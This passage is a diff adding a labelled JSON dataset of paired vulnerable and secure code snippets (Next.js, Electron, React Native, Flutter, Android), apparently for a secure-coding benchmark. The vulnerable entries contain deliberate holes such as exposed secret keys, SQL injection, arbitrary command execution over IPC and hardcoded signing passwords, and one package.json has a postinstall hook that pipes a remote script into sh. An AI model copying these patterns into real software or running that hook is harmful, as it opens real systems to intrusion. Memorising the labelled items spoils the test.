@@ -1,0 +1,474 @@
+[
+  {
+    "id": "GW01V",
+    "track": "web",
+    "module": "01-secret-boundaries",
+    "label": "vulnerable",
+    "prompt": "Create a Next.js component that starts a Stripe checkout session.",
+    "files": {
+      "CheckoutButton.tsx": "\"use client\";\nimport Stripe from \"stripe\";\n\nconst stripe = new Stripe(process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY!);\n\nexport default function CheckoutButton({ priceId }: { priceId: string }) {\n  async function go() {\n    const session = await stripe.checkout.sessions.create({\n      line_items: [{ price: priceId, quantity: 1 }],\n      mode: \"payment\",\n      success_url: \"https://example.com/ok\",\n    });\n    window.location.href = session.url!;\n  }\n  return <button onClick={go}>Buy</button>;\n}\n"
+    }
+  },
+  {
+    "id": "GW01S",
+    "track": "web",
+    "module": "01-secret-boundaries",
+    "label": "not_vulnerable",
+    "prompt": "Create a Next.js component that starts a Stripe checkout session.",
+    "files": {
+      "app/api/checkout/route.ts": "import Stripe from \"stripe\";\nimport { NextResponse } from \"next/server\";\nimport { auth } from \"@/lib/auth\";\n\nconst stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);\n\nexport async function POST(req: Request) {\n  const session = await auth();\n  if (!session?.user) return NextResponse.json({ error: \"unauthorized\" }, { status: 401 });\n  const { priceId } = await req.json();\n  const checkout = await stripe.checkout.sessions.create({\n    line_items: [{ price: priceId, quantity: 1 }],\n    mode: \"payment\",\n    success_url: \"https://example.com/ok\",\n  });\n  return NextResponse.json({ url: checkout.url });\n}\n",
+      "CheckoutButton.tsx": "\"use client\";\nexport default function CheckoutButton({ priceId }: { priceId: string }) {\n  async function go() {\n    const r = await fetch(\"/api/checkout\", { method: \"POST\", body: JSON.stringify({ priceId }) });\n    const { url } = await r.json();\n    window.location.href = url;\n  }\n  return <button onClick={go}>Buy</button>;\n}\n"
+    }
+  },
+  {
+    "id": "GW02V",
+    "track": "web",
+    "module": "01-secret-boundaries",
+    "label": "vulnerable",
+    "prompt": "Write a Supabase admin client for listing users.",
+    "files": {
+      "lib/supabaseAdmin.ts": "import { createClient } from \"@supabase/supabase-js\";\n\nexport const supabaseAdmin = createClient(\n  process.env.NEXT_PUBLIC_SUPABASE_URL!,\n  \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.service_role.demo\",\n);\n\nexport async function listUsers() {\n  const { data } = await supabaseAdmin.from(\"users\").select(\"*\");\n  return data;\n}\n"
+    }
+  },
+  {
+    "id": "GW02S",
+    "track": "web",
+    "module": "01-secret-boundaries",
+    "label": "not_vulnerable",
+    "prompt": "Write a Supabase client for the browser.",
+    "files": {
+      "lib/supabaseClient.ts": "import { createClient } from \"@supabase/supabase-js\";\n\nexport const supabase = createClient(\n  process.env.NEXT_PUBLIC_SUPABASE_URL!,\n  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,\n);\n"
+    }
+  },
+  {
+    "id": "GW03V",
+    "track": "web",
+    "module": "02-zero-trust-auth",
+    "label": "vulnerable",
+    "prompt": "Write a Server Action that updates a user profile.",
+    "files": {
+      "actions/profile.ts": "\"use server\";\nimport { db } from \"@/lib/db\";\n\nexport async function updateUserProfile(userId: string, data: { name: string; bio: string }) {\n  await db.user.update({ where: { id: userId }, data });\n  return { ok: true };\n}\n"
+    }
+  },
+  {
+    "id": "GW03S",
+    "track": "web",
+    "module": "02-zero-trust-auth",
+    "label": "not_vulnerable",
+    "prompt": "Write a Server Action that updates a user profile.",
+    "files": {
+      "actions/profile.ts": "\"use server\";\nimport { db } from \"@/lib/db\";\nimport { auth } from \"@/lib/auth\";\nimport { z } from \"zod\";\n\nconst Schema = z.object({ name: z.string().min(1).max(80), bio: z.string().max(500) });\n\nexport async function updateUserProfile(data: unknown) {\n  const session = await auth();\n  if (!session?.user?.id) throw new Error(\"unauthorized\");\n  const parsed = Schema.parse(data);\n  await db.user.update({ where: { id: session.user.id }, data: parsed });\n  return { ok: true };\n}\n"
+    }
+  },
+  {
+    "id": "GW04V",
+    "track": "web",
+    "module": "02-zero-trust-auth",
+    "label": "vulnerable",
+    "prompt": "Provide the SQL schema for a multi-tenant documents table.",
+    "files": {
+      "schema.sql": "create table documents (\n  id uuid primary key default gen_random_uuid(),\n  org_id uuid not null,\n  owner_id uuid not null references auth.users(id),\n  title text not null,\n  body text,\n  created_at timestamptz default now()\n);\n\ncreate index on documents (org_id);\n"
+    }
+  },
+  {
+    "id": "GW04S",
+    "track": "web",
+    "module": "02-zero-trust-auth",
+    "label": "not_vulnerable",
+    "prompt": "Provide the SQL schema for a multi-tenant documents table.",
+    "files": {
+      "schema.sql": "create table documents (\n  id uuid primary key default gen_random_uuid(),\n  org_id uuid not null,\n  owner_id uuid not null references auth.users(id),\n  title text not null,\n  body text\n);\n\nalter table documents enable row level security;\nalter table documents force row level security;\n\ncreate policy documents_select on documents for select\n  using (owner_id = auth.uid());\ncreate policy documents_insert on documents for insert\n  with check (owner_id = auth.uid());\ncreate policy documents_update on documents for update\n  using (owner_id = auth.uid()) with check (owner_id = auth.uid());\ncreate policy documents_delete on documents for delete\n  using (owner_id = auth.uid());\n"
+    }
+  },
+  {
+    "id": "GW05V",
+    "track": "web",
+    "module": "03-injection-defense",
+    "label": "vulnerable",
+    "prompt": "Write a search function with dynamic sorting.",
+    "files": {
+      "search.ts": "import { pool } from \"./db\";\n\nexport async function search(term: string, sortCol: string, dir: string) {\n  const sql = `SELECT * FROM products WHERE name LIKE '%${term}%' ORDER BY ${sortCol} ${dir}`;\n  const { rows } = await pool.query(sql);\n  return rows;\n}\n"
+    }
+  },
+  {
+    "id": "GW05S",
+    "track": "web",
+    "module": "03-injection-defense",
+    "label": "not_vulnerable",
+    "prompt": "Write a search function with dynamic sorting.",
+    "files": {
+      "search.ts": "import { pool } from \"./db\";\n\nconst COLS: Record<string, string> = { name: \"name\", price: \"price\", created: \"created_at\" };\nconst DIRS: Record<string, string> = { asc: \"ASC\", desc: \"DESC\" };\n\nexport async function search(term: string, sortCol: string, dir: string) {\n  const col = COLS[sortCol] ?? \"name\";\n  const d = DIRS[dir] ?? \"ASC\";\n  const { rows } = await pool.query(\n    `SELECT * FROM products WHERE name LIKE $1 ORDER BY ${col} ${d}`,\n    [`%${term}%`],\n  );\n  return rows;\n}\n"
+    }
+  },
+  {
+    "id": "GW06V",
+    "track": "web",
+    "module": "03-injection-defense",
+    "label": "vulnerable",
+    "prompt": "Render user-submitted markdown.",
+    "files": {
+      "Preview.tsx": "import { marked } from \"marked\";\n\nexport function Preview({ md }: { md: string }) {\n  return <div dangerouslySetInnerHTML={{ __html: marked.parse(md) as string }} />;\n}\n"
+    }
+  },
+  {
+    "id": "GW06S",
+    "track": "web",
+    "module": "03-injection-defense",
+    "label": "not_vulnerable",
+    "prompt": "Render user-submitted markdown.",
+    "files": {
+      "Preview.tsx": "import { marked } from \"marked\";\nimport DOMPurify from \"isomorphic-dompurify\";\n\nexport function Preview({ md }: { md: string }) {\n  const html = DOMPurify.sanitize(marked.parse(md) as string, { USE_PROFILES: { html: true } });\n  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n}\n"
+    }
+  },
+  {
+    "id": "GW07V",
+    "track": "web",
+    "module": "03-injection-defense",
+    "label": "vulnerable",
+    "prompt": "Write an auth callback that redirects after login.",
+    "files": {
+      "app/auth/callback/route.ts": "import { NextResponse } from \"next/server\";\n\nexport async function GET(req: Request) {\n  const returnTo = new URL(req.url).searchParams.get(\"returnTo\") || \"/\";\n  return NextResponse.redirect(returnTo);\n}\n"
+    }
+  },
+  {
+    "id": "GW07S",
+    "track": "web",
+    "module": "03-injection-defense",
+    "label": "not_vulnerable",
+    "prompt": "Write an auth callback that redirects after login.",
+    "files": {
+      "app/auth/callback/route.ts": "import { NextResponse } from \"next/server\";\n\nconst ALLOWED = new Set([\"/\", \"/dashboard\", \"/settings\", \"/billing\"]);\n\nexport async function GET(req: Request) {\n  const raw = new URL(req.url).searchParams.get(\"returnTo\") || \"/\";\n  const target = ALLOWED.has(raw) ? raw : \"/\";\n  return NextResponse.redirect(new URL(target, req.url));\n}\n"
+    }
+  },
+  {
+    "id": "GW08V",
+    "track": "web",
+    "module": "04-supply-chain",
+    "label": "vulnerable",
+    "prompt": "Provide a package.json for an HTML-to-PDF utility.",
+    "files": {
+      "package.json": "{\n  \"name\": \"pdf-util\",\n  \"version\": \"1.0.0\",\n  \"scripts\": { \"postinstall\": \"curl -sL https://cdn.example.com/setup.sh | sh\" },\n  \"dependencies\": {\n    \"puppeteer\": \"^22.0.0\",\n    \"html-pdf-node\": \"latest\",\n    \"express\": \"*\"\n  }\n}\n"
+    }
+  },
+  {
+    "id": "GW08S",
+    "track": "web",
+    "module": "04-supply-chain",
+    "label": "not_vulnerable",
+    "prompt": "Provide a package.json for an HTML-to-PDF utility.",
+    "files": {
+      "package.json": "{\n  \"name\": \"pdf-util\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"puppeteer\": \"22.11.2\",\n    \"express\": \"4.19.2\"\n  }\n}\n",
+      ".npmrc": "ignore-scripts=true\nsave-exact=true\naudit=true\n"
+    }
+  },
+  {
+    "id": "GA01V",
+    "track": "app",
+    "module": "01-hardware-secure-storage",
+    "label": "vulnerable",
+    "prompt": "Persist the user's refresh token in React Native.",
+    "files": {
+      "authStore.ts": "import AsyncStorage from \"@react-native-async-storage/async-storage\";\n\nexport async function saveSession(accessToken: string, refreshToken: string) {\n  await AsyncStorage.setItem(\"accessToken\", accessToken);\n  await AsyncStorage.setItem(\"refreshToken\", refreshToken);\n}\n\nexport async function loadSession() {\n  return {\n    accessToken: await AsyncStorage.getItem(\"accessToken\"),\n    refreshToken: await AsyncStorage.getItem(\"refreshToken\"),\n  };\n}\n"
+    }
+  },
+  {
+    "id": "GA01S",
+    "track": "app",
+    "module": "01-hardware-secure-storage",
+    "label": "not_vulnerable",
+    "prompt": "Persist the user's refresh token in React Native.",
+    "files": {
+      "authStore.ts": "import * as Keychain from \"react-native-keychain\";\n\nlet accessToken: string | null = null;   // memory only\n\nexport async function saveSession(access: string, refresh: string) {\n  accessToken = access;\n  await Keychain.setGenericPassword(\"session\", refresh, {\n    accessible: Keychain.ACCESSIBLE.WHEN_UNLOCKED_THIS_DEVICE_ONLY,\n    service: \"com.example.app.refresh\",\n  });\n}\n\nexport async function loadRefresh() {\n  const c = await Keychain.getGenericPassword({ service: \"com.example.app.refresh\" });\n  return c ? c.password : null;\n}\nexport function getAccess() { return accessToken; }\n"
+    }
+  },
+  {
+    "id": "GA02V",
+    "track": "app",
+    "module": "01-hardware-secure-storage",
+    "label": "vulnerable",
+    "prompt": "Store an auth token in Flutter.",
+    "files": {
+      "session_store.dart": "import 'package:shared_preferences/shared_preferences.dart';\n\nclass SessionStore {\n  Future<void> save(String token) async {\n    final prefs = await SharedPreferences.getInstance();\n    await prefs.setString('auth_token', token);\n  }\n\n  Future<String?> read() async {\n    final prefs = await SharedPreferences.getInstance();\n    return prefs.getString('auth_token');\n  }\n}\n"
+    }
+  },
+  {
+    "id": "GA02S",
+    "track": "app",
+    "module": "01-hardware-secure-storage",
+    "label": "not_vulnerable",
+    "prompt": "Store a theme preference in Flutter.",
+    "files": {
+      "prefs.dart": "import 'package:shared_preferences/shared_preferences.dart';\n\nclass ThemeStore {\n  Future<void> save(String mode) async {\n    final prefs = await SharedPreferences.getInstance();\n    await prefs.setString('theme_mode', mode);\n  }\n\n  Future<String> read() async {\n    final prefs = await SharedPreferences.getInstance();\n    return prefs.getString('theme_mode') ?? 'system';\n  }\n}\n"
+    }
+  },
+  {
+    "id": "GA03V",
+    "track": "app",
+    "module": "02-desktop-process-isolation",
+    "label": "vulnerable",
+    "prompt": "Create the Electron main window.",
+    "files": {
+      "main.js": "const { app, BrowserWindow } = require('electron');\n\nfunction createWindow() {\n  const win = new BrowserWindow({\n    width: 1200, height: 800,\n    webPreferences: { nodeIntegration: true, contextIsolation: false, webSecurity: false },\n  });\n  win.loadFile('index.html');\n}\napp.whenReady().then(createWindow);\n"
+    }
+  },
+  {
+    "id": "GA03S",
+    "track": "app",
+    "module": "02-desktop-process-isolation",
+    "label": "not_vulnerable",
+    "prompt": "Create the Electron main window.",
+    "files": {
+      "main.js": "const { app, BrowserWindow, shell } = require('electron');\nconst path = require('path');\n\nfunction createWindow() {\n  const win = new BrowserWindow({\n    width: 1200, height: 800,\n    webPreferences: {\n      nodeIntegration: false,\n      contextIsolation: true,\n      sandbox: true,\n      preload: path.join(__dirname, 'preload.js'),\n    },\n  });\n  win.webContents.setWindowOpenHandler(() => ({ action: 'deny' }));\n  win.webContents.on('will-navigate', (e) => e.preventDefault());\n  win.loadFile('index.html');\n}\napp.whenReady().then(createWindow);\n"
+    }
+  },
+  {
+    "id": "GA04V",
+    "track": "app",
+    "module": "02-desktop-process-isolation",
+    "label": "vulnerable",
+    "prompt": "Run a git command from the renderer over IPC.",
+    "files": {
+      "ipc.js": "const { ipcMain } = require('electron');\nconst { exec } = require('child_process');\n\nipcMain.handle('git:run', async (_e, args) => {\n  return new Promise((res, rej) => {\n    exec(`git ${args}`, { cwd: process.cwd() }, (err, stdout) => err ? rej(err) : res(stdout));\n  });\n});\n"
+    }
+  },
+  {
+    "id": "GA04S",
+    "track": "app",
+    "module": "02-desktop-process-isolation",
+    "label": "not_vulnerable",
+    "prompt": "Run a git command from the renderer over IPC.",
+    "files": {
+      "ipc.js": "const { ipcMain } = require('electron');\nconst { execFile } = require('child_process');\n\nconst ALLOWED = new Set(['status', 'log', 'diff']);\n\nipcMain.handle('git:run', async (event, sub) => {\n  if (event.senderFrame.url !== MAIN_URL) throw new Error('bad sender');\n  if (typeof sub !== 'string' || !ALLOWED.has(sub)) throw new Error('command not allowed');\n  return new Promise((res, rej) => {\n    execFile('git', [sub], { cwd: REPO_ROOT }, (err, stdout) => err ? rej(err) : res(stdout));\n  });\n});\n"
+    }
+  },
+  {
+    "id": "GA05V",
+    "track": "app",
+    "module": "03-binary-trust-and-gateways",
+    "label": "vulnerable",
+    "prompt": "Call the OpenAI API from a Flutter client.",
+    "files": {
+      "ai_service.dart": "import 'package:http/http.dart' as http;\n\nconst String kApiKey = 'sk-proj-REPLACE_WITH_YOUR_KEY';\n\nFuture<String> ask(String prompt) async {\n  final r = await http.post(\n    Uri.parse('https://api.openai.com/v1/chat/completions'),\n    headers: {'Authorization': 'Bearer $kApiKey', 'Content-Type': 'application/json'},\n    body: '{\"model\":\"gpt-4o\",\"messages\":[{\"role\":\"user\",\"content\":\"$prompt\"}]}',\n  );\n  return r.body;\n}\n"
+    }
+  },
+  {
+    "id": "GA05S",
+    "track": "app",
+    "module": "03-binary-trust-and-gateways",
+    "label": "not_vulnerable",
+    "prompt": "Call the OpenAI API from a Flutter client.",
+    "files": {
+      "ai_service.dart": "import 'package:http/http.dart' as http;\n\nFuture<String> ask(String prompt, String sessionJwt) async {\n  final r = await http.post(\n    Uri.parse('https://api.example.com/v1/assist'),\n    headers: {'Authorization': 'Bearer $sessionJwt', 'Content-Type': 'application/json'},\n    body: '{\"prompt\": ${Uri.encodeComponent(prompt)}}',\n  );\n  return r.body;\n}\n"
+    }
+  },
+  {
+    "id": "GA06V",
+    "track": "app",
+    "module": "03-binary-trust-and-gateways",
+    "label": "vulnerable",
+    "prompt": "Check whether the user has a Pro subscription.",
+    "files": {
+      "entitlement.ts": "import AsyncStorage from \"@react-native-async-storage/async-storage\";\n\nexport async function isPro(): Promise<boolean> {\n  const flag = await AsyncStorage.getItem(\"is_pro\");\n  return flag === \"true\";\n}\n\nexport function unlockPremium(nav: any) {\n  if (isPro()) nav.navigate(\"PremiumScreen\");\n}\n"
+    }
+  },
+  {
+    "id": "GA06S",
+    "track": "app",
+    "module": "03-binary-trust-and-gateways",
+    "label": "not_vulnerable",
+    "prompt": "Check whether the user has a Pro subscription.",
+    "files": {
+      "entitlement.ts": "import { api } from \"./api\";\n\nexport async function fetchEntitlement(): Promise<{ pro: boolean; expires: string | null }> {\n  // Server validates the store receipt and returns the authoritative answer.\n  const r = await api.get(\"/v1/me/entitlement\");\n  return r.data;\n}\n"
+    }
+  },
+  {
+    "id": "GA07V",
+    "track": "app",
+    "module": "04-deep-link-verification",
+    "label": "vulnerable",
+    "prompt": "Handle myapp:// deep links in React Native.",
+    "files": {
+      "deeplink.ts": "import { Linking } from \"react-native\";\n\nexport function initDeepLinks(navigation: any) {\n  Linking.addEventListener(\"url\", ({ url }) => {\n    const u = new URL(url);\n    const route = u.pathname.replace(\"/\", \"\");\n    const params = Object.fromEntries(u.searchParams.entries());\n    navigation.navigate(route, params);\n  });\n}\n"
+    }
+  },
+  {
+    "id": "GA07S",
+    "track": "app",
+    "module": "04-deep-link-verification",
+    "label": "not_vulnerable",
+    "prompt": "Handle myapp:// deep links in React Native.",
+    "files": {
+      "deeplink.ts": "import { Linking } from \"react-native\";\nimport { z } from \"zod\";\n\nconst ROUTES = {\n  \"reset-password\": { screen: \"ResetPassword\", schema: z.object({ token: z.string().min(20) }) },\n  \"order\": { screen: \"OrderDetail\", schema: z.object({ id: z.string().uuid() }) },\n} as const;\n\nexport function initDeepLinks(navigation: any) {\n  Linking.addEventListener(\"url\", ({ url }) => {\n    const u = new URL(url);\n    if (u.protocol !== \"myapp:\") return;\n    const entry = ROUTES[u.pathname.replace(\"/\", \"\") as keyof typeof ROUTES];\n    if (!entry) return;                              // reject, never repair\n    const parsed = entry.schema.safeParse(Object.fromEntries(u.searchParams));\n    if (!parsed.success) return;\n    navigation.navigate(entry.screen, parsed.data);  // navigation only, no authority\n  });\n}\n"
+    }
+  },
+  {
+    "id": "GA08V",
+    "track": "app",
+    "module": "04-deep-link-verification",
+    "label": "vulnerable",
+    "prompt": "Open an in-app WebView from a deep link.",
+    "files": {
+      "webview.ts": "import { WebView } from \"react-native-webview\";\n\nexport function openFromLink(url: string, nav: any) {\n  if (url.includes(\"example.com\")) {\n    nav.navigate(\"Web\", { uri: url });\n  }\n}\n"
+    }
+  },
+  {
+    "id": "GA08S",
+    "track": "app",
+    "module": "04-deep-link-verification",
+    "label": "not_vulnerable",
+    "prompt": "Open an in-app WebView from a deep link.",
+    "files": {
+      "webview.ts": "const ALLOWED_HOSTS = new Set([\"www.example.com\", \"help.example.com\"]);\n\nexport function openFromLink(raw: string, nav: any) {\n  let u: URL;\n  try { u = new URL(raw); } catch { return; }\n  if (u.protocol !== \"https:\") return;\n  if (!ALLOWED_HOSTS.has(u.hostname)) return;\n  nav.navigate(\"Web\", { uri: u.toString() });\n}\n"
+    }
+  },
+  {
+    "id": "GA09V",
+    "track": "app",
+    "module": "05-build-integrity-and-updates",
+    "label": "vulnerable",
+    "prompt": "Provide the Android release signing configuration.",
+    "files": {
+      "app/build.gradle": "android {\n    signingConfigs {\n        release {\n            storeFile file(\"../keystore/release.jks\")\n            storePassword \"Sup3rSecret!\"\n            keyAlias \"upload\"\n            keyPassword \"Sup3rSecret!\"\n        }\n    }\n    buildTypes {\n        release {\n            signingConfig signingConfigs.release\n            minifyEnabled false\n            debuggable true\n        }\n    }\n}\n"
+    }
+  },
+  {
+    "id": "GA09S",
+    "track": "app",
+    "module": "05-build-integrity-and-updates",
+    "label": "not_vulnerable",
+    "prompt": "Provide the Android release signing configuration.",
+    "files": {
+      "app/build.gradle": "def keystoreProps = new Properties()\ndef propsFile = rootProject.file(\"keystore.properties\")   // gitignored\nif (propsFile.exists()) { keystoreProps.load(new FileInputStream(propsFile)) }\n\nandroid {\n    signingConfigs {\n        release {\n            storeFile file(keystoreProps[\"storeFile\"] ?: System.getenv(\"KEYSTORE_PATH\"))\n            storePassword keystoreProps[\"storePassword\"] ?: System.getenv(\"KEYSTORE_PASSWORD\")\n            keyAlias keystoreProps[\"keyAlias\"] ?: System.getenv(\"KEY_ALIAS\")\n            keyPassword keystoreProps[\"keyPassword\"] ?: System.getenv(\"KEY_PASSWORD\")\n        }\n    }\n    buildTypes {\n        release {\n            signingConfig signingConfigs.release\n            minifyEnabled true\n            debuggable false\n        }\n    }\n}\n"
+    }
+  },
+  {
+    "id": "GB01",
+    "track": "web",
+    "module": "benign",
+    "label": "not_vulnerable",
+    "prompt": "Create a React pagination component.",
+    "files": {
+      "Pagination.tsx": "export function Pagination({ currentPage, totalPages, onPageChange }:\n  { currentPage: number; totalPages: number; onPageChange: (p: number) => void }) {\n  const pages = Array.from({ length: totalPages }, (_, i) => i + 1);\n  return (\n    <nav aria-label=\"Pagination\">\n      <button disabled={currentPage === 1} onClick={() => onPageChange(currentPage - 1)}>Prev</button>\n      {pages.map((p) => (\n        <button key={p} aria-current={p === currentPage} onClick={() => onPageChange(p)}>{p}</button>\n      ))}\n      <button disabled={currentPage === totalPages} onClick={() => onPageChange(currentPage + 1)}>Next</button>\n    </nav>\n  );\n}\n"
+    }
+  },
+  {
+    "id": "GB02",
+    "track": "web",
+    "module": "benign",
+    "label": "not_vulnerable",
+    "prompt": "Write a useDebounce hook.",
+    "files": {
+      "useDebounce.ts": "import { useEffect, useState } from \"react\";\n\nexport function useDebounce<T>(value: T, delay = 300): T {\n  const [debounced, setDebounced] = useState(value);\n  useEffect(() => {\n    const t = setTimeout(() => setDebounced(value), delay);\n    return () => clearTimeout(t);\n  }, [value, delay]);\n  return debounced;\n}\n"
+    }
+  },
+  {
+    "id": "GB03",
+    "track": "app",
+    "module": "benign",
+    "label": "not_vulnerable",
+    "prompt": "Remember the user's chosen theme in an Electron app.",
+    "files": {
+      "theme.js": "const Store = require('electron-store');\nconst store = new Store();\n\nfunction getTheme() { return store.get('theme', 'system'); }\nfunction setTheme(mode) {\n  if (!['light', 'dark', 'system'].includes(mode)) return;\n  store.set('theme', mode);\n}\nmodule.exports = { getTheme, setTheme };\n"
+    }
+  },
+  {
+    "id": "GB04",
+    "track": "app",
+    "module": "benign",
+    "label": "not_vulnerable",
+    "prompt": "Format a duration in seconds as mm:ss.",
+    "files": {
+      "duration.ts": "export function formatDuration(totalSeconds: number): string {\n  const s = Math.max(0, Math.floor(totalSeconds));\n  const m = Math.floor(s / 60);\n  return `${String(m).padStart(2, \"0\")}:${String(s % 60).padStart(2, \"0\")}`;\n}\n"
+    }
+  },
+  {
+    "id": "RF-vuln-preload",
+    "track": "app",
+    "module": "02-desktop-process-isolation",
+    "label": "vulnerable",
+    "prompt": "Write an Electron preload script exposing app functionality to the renderer.",
+    "files": {
+      "preload.js": "const { contextBridge, ipcRenderer } = require('electron');\n\ncontextBridge.exposeInMainWorld('api', {\n  fs: require('fs'),\n  ipcRenderer,\n  bridge: ipcRenderer,\n  invoke: (channel, ...args) => ipcRenderer.invoke(channel, ...args),\n  send: (channel, ...args) => ipcRenderer.send(channel, ...args),\n});\n"
+    }
+  },
+  {
+    "id": "RF-reme-preload",
+    "track": "app",
+    "module": "02-desktop-process-isolation",
+    "label": "not_vulnerable",
+    "prompt": "Write an Electron preload script exposing app functionality to the renderer.",
+    "files": {
+      "preload.js": "const { contextBridge, ipcRenderer } = require('electron');\n\ncontextBridge.exposeInMainWorld('appApi', {\n  openDocsPage: (page) => ipcRenderer.invoke('docs:open', { page }),\n  renderReport: (reportId) => ipcRenderer.invoke('report:render', { reportId }),\n  onSyncProgress: (cb) => {\n    const handler = (_event, percent) => cb(percent);\n    ipcRenderer.on('sync:progress', handler);\n    return () => ipcRenderer.removeListener('sync:progress', handler);\n  },\n});\n"
+    }
+  },
+  {
+    "id": "RF-vuln-electron-main",
+    "track": "app",
+    "module": "02-desktop-process-isolation",
+    "label": "vulnerable",
+    "prompt": "Write the Electron main process window setup and IPC handlers.",
+    "files": {
+      "electron-main.js": "const { app, BrowserWindow, ipcMain, shell } = require('electron');\nconst { exec } = require('child_process');\n\nfunction createWindow() {\n  const win = new BrowserWindow({\n    webPreferences: {\n      nodeIntegration: true,\n      contextIsolation: false,\n      webSecurity: false,\n      sandbox: false,\n    },\n  });\n  win.loadURL('https://app.example.com/');\n}\n\nipcMain.handle('run-command', async (event, cmd) => {\n  return new Promise((resolve) => exec(cmd, (e, out) => resolve(out)));\n});\n\napp.on('web-contents-created', (_e, contents) => {\n  contents.setWindowOpenHandler(({ url }) => ({ action: 'allow' }));\n});\n\napp.on('second-instance', (_event, argv) => {\n  mainWindow.loadURL(argv[argv.length - 1]);\n});\n\napp.commandLine.appendSwitch('remote-debugging-port', '9229');\n\nmodule.exports = { createWindow };\n"
+    }
+  },
+  {
+    "id": "RF-reme-electron-main",
+    "track": "app",
+    "module": "02-desktop-process-isolation",
+    "label": "not_vulnerable",
+    "prompt": "Write the Electron main process window setup and IPC handlers.",
+    "files": {
+      "electron-main.js": "const { app, BrowserWindow, ipcMain, shell, session } = require('electron');\nconst { execFile } = require('node:child_process');\nconst path = require('node:path');\n\nconst APP_ORIGIN = 'app://notes';\nconst DOCS = new Map([['shortcuts', 'https://docs.example.com/shortcuts']]);\n\napp.enableSandbox();\n\nfunction createWindow() {\n  const win = new BrowserWindow({\n    webPreferences: {\n      nodeIntegration: false,\n      nodeIntegrationInWorker: false,\n      nodeIntegrationInSubFrames: false,\n      contextIsolation: true,\n      sandbox: true,\n      webSecurity: true,\n      allowRunningInsecureContent: false,\n      webviewTag: false,\n      experimentalFeatures: false,\n      preload: path.join(__dirname, 'preload.js'),\n    },\n  });\n  win.loadURL(`${APP_ORIGIN}/index.html`);\n}\n\nfunction isTrustedFrame(frame) {\n  try { return frame && frame.parent === null && new URL(frame.url).origin === APP_ORIGIN; }\n  catch { return false; }\n}\n\nipcMain.handle('docs:open', async (event, payload) => {\n  if (!isTrustedFrame(event.senderFrame)) throw new Error('E_FORBIDDEN');\n  const target = DOCS.get(payload && payload.page);\n  if (!target) throw new Error('E_UNKNOWN_PAGE');\n  if (new URL(target).protocol !== 'https:') throw new Error('E_PROTOCOL');\n  await shell.openExternal(target);\n  return { opened: true };\n});\n\nipcMain.handle('report:render', async (event, payload) => {\n  if (!isTrustedFrame(event.senderFrame)) throw new Error('E_FORBIDDEN');\n  const id = String(payload && payload.reportId);\n  if (!/^[0-9a-f-]{36}$/.test(id)) throw new Error('E_SCHEMA');\n  return new Promise((resolve, reject) => {\n    execFile('/usr/local/bin/render-report', [id], (err, out) => (err ? reject(err) : resolve(out)));\n  });\n});\n\napp.on('web-contents-created', (_e, contents) => {\n  const internal = (u) => { try { return new URL(u).origin === APP_ORIGIN; } catch { return false; } };\n  contents.on('will-navigate', (e, url) => { if (!internal(url)) e.preventDefault(); });\n  contents.setWindowOpenHandler(() => ({ action: 'deny' }));\n});\n\napp.whenReady().then(() => {\n  session.defaultSession.setPermissionRequestHandler((_wc, _p, cb) => cb(false));\n  session.defaultSession.webRequest.onHeadersReceived((details, cb) => {\n    cb({ responseHeaders: { ...details.responseHeaders,\n      'Content-Security-Policy': [\"default-src 'self'; object-src 'none'; base-uri 'none'\"] } });\n  });\n  createWindow();\n});\n"
+    }
+  },
+  {
+    "id": "RF-vuln-auth",
+    "track": "app",
+    "module": "01-hardware-secure-storage",
+    "label": "vulnerable",
+    "prompt": "Write the mobile authentication and session persistence module.",
+    "files": {
+      "auth.ts": "import AsyncStorage from '@react-native-async-storage/async-storage';\n\nexport async function save(accessToken: string, refreshToken: string) {\n  await AsyncStorage.setItem('authToken', accessToken);\n  await AsyncStorage.setItem('refreshToken', refreshToken);\n  localStorage.setItem('sessionToken', accessToken);\n}\n\nexport function client() {\n  return fetch('https://api.example.com/v1/x', { rejectUnauthorized: false } as any);\n}\n\nexport function unsafeEnv() {\n  return process.env.EXPO_PUBLIC_STRIPE_SECRET_KEY;\n}\n\nexport function handleLink(url: string, navigation: any) {\n  const parsed = new URL(url);\n  if (url.startsWith('https://links.example.com')) {\n    navigation.navigate('Home');\n  }\n  return parsed;\n}\n"
+    }
+  },
+  {
+    "id": "RF-reme-auth",
+    "track": "app",
+    "module": "01-hardware-secure-storage",
+    "label": "not_vulnerable",
+    "prompt": "Write the mobile authentication and session persistence module.",
+    "files": {
+      "auth.ts": "import * as Keychain from 'react-native-keychain';\n\nconst SERVICE = 'com.example.app.auth';\nconst ALLOWED_HOSTS = new Set(['links.example.com']);\nconst ROUTES = new Map([['order-detail', /^[0-9a-f-]{36}$/]]);\n\nlet accessToken: string | null = null;\n\nexport async function save(at: string, refresh: string) {\n  accessToken = at;\n  await Keychain.setGenericPassword('refresh', refresh, {\n    service: SERVICE,\n    accessible: Keychain.ACCESSIBLE.WHEN_UNLOCKED_THIS_DEVICE_ONLY,\n    securityLevel: Keychain.SECURITY_LEVEL.SECURE_HARDWARE,\n  });\n}\n\nexport function client() {\n  return fetch('https://api.example.com/v1/x', {\n    headers: { Authorization: `Bearer ${accessToken}` },\n  });\n}\n\nexport function resolveDeepLink(raw: string) {\n  let parsed: URL;\n  try { parsed = new URL(raw); } catch { return null; }\n  if (parsed.protocol !== 'https:') return null;\n  if (!ALLOWED_HOSTS.has(parsed.hostname)) return null;\n  if (parsed.username || parsed.password) return null;\n  const key = parsed.pathname.split('/').filter(Boolean)[0];\n  const schema = key ? ROUTES.get(key) : undefined;\n  if (!schema) return null;\n  const id = parsed.searchParams.get('orderId') ?? '';\n  if (!schema.test(id)) return null;\n  return { route: key, params: { orderId: id } };\n}\n"
+    }
+  },
+  {
+    "id": "RF-vuln-AndroidManifest",
+    "track": "app",
+    "module": "04-deep-link-verification",
+    "label": "vulnerable",
+    "prompt": "Provide the AndroidManifest.xml for the application.",
+    "files": {
+      "AndroidManifest.xml": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\">\n  <application\n      android:allowBackup=\"true\"\n      android:usesCleartextTraffic=\"true\"\n      android:debuggable=\"true\">\n    <activity android:name=\".MainActivity\" />\n  </application>\n</manifest>\n"
+    }
+  },
+  {
